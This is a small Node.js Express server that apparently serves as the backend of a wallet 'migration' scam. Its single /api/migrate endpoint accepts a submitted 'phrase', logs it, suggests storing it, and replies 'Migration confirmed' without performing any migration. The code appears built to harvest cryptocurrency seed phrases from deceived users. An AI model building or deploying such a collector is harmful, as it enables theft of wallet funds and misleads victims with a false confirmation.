const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(bodyParser.json());

app.post("/api/migrate", (req, res) => {
  const { phrase } = req.body;
  console.log("Received phrase:", phrase);

  if (!phrase) {
    return res.status(400).json({ message: "Phrase is required." });
  }

  // You can save to a file or database here if you want.

  res.json({ message: "Migration confirmed" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
